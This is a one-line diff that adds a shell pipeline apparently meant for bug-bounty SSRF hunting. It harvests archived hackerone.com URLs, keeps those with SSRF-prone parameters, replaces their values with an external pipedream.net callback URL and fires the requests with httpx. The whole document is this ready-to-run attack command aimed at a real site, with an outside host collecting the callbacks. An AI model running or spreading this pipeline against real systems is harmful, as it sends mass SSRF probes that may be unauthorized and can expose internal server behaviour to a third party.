@@ -1,0 +1,1 @@
+waybackurls hackerone.com | deduplicate | gf ssrf | qsreplace https://eor2b9kk6eie47t.m.pipedream.net/ | httpx
